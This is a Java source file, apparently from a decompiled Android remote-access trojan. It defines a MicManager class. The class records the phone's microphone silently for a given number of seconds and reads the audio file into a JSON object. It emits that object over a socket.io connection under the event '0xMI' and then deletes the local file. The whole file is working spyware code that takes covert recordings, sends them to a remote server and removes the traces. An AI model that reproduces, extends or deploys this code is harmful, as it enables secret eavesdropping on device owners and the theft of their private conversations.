package com.example.project20;

import android.media.MediaRecorder;
import android.util.Log;
import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.util.Timer;
import java.util.TimerTask;
import org.json.JSONException;
import org.json.JSONObject;

public class MicManager {
    static final String TAG = "MediaRecording";
    static File audiofile;
    static MediaRecorder recorder;
    static TimerTask stopRecording;

    public static void startRecording(int i) throws Exception {
        File cacheDir = MainService.getContextOfApplication().getCacheDir();
        try {
            Log.e("DIRR", cacheDir.getAbsolutePath());
            audiofile = File.createTempFile("sound", ".mp3", cacheDir);
            MediaRecorder mediaRecorder = new MediaRecorder();
            recorder = mediaRecorder;
            mediaRecorder.setAudioSource(1);
            recorder.setOutputFormat(2);
            recorder.setAudioEncoder(3);
            recorder.setOutputFile(audiofile.getAbsolutePath());
            recorder.prepare();
            recorder.start();
            stopRecording = new TimerTask() {
                /* class com.example.project20.MicManager.AnonymousClass1 */

                public void run() {
                    MicManager.recorder.stop();
                    MicManager.recorder.release();
                    MicManager.sendVoice(MicManager.audiofile);
                    MicManager.audiofile.delete();
                }
            };
            new Timer().schedule(stopRecording, (long) (i * 1000));
        } catch (IOException unused) {
            Log.e(TAG, "external storage access error");
        }
    }

    /* access modifiers changed from: private */
    public static void sendVoice(File file) {
        int length = (int) file.length();
        byte[] bArr = new byte[length];
        try {
            BufferedInputStream bufferedInputStream = new BufferedInputStream(new FileInputStream(file));
            bufferedInputStream.read(bArr, 0, length);
            JSONObject jSONObject = new JSONObject();
            jSONObject.put("file", true);
            jSONObject.put("name", file.getName());
            jSONObject.put("buffer", bArr);
            IOSocket.getInstance().getIoSocket().emit("0xMI", jSONObject);
            bufferedInputStream.close();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e2) {
            e2.printStackTrace();
        } catch (JSONException e3) {
            e3.printStackTrace();
        }
    }
}
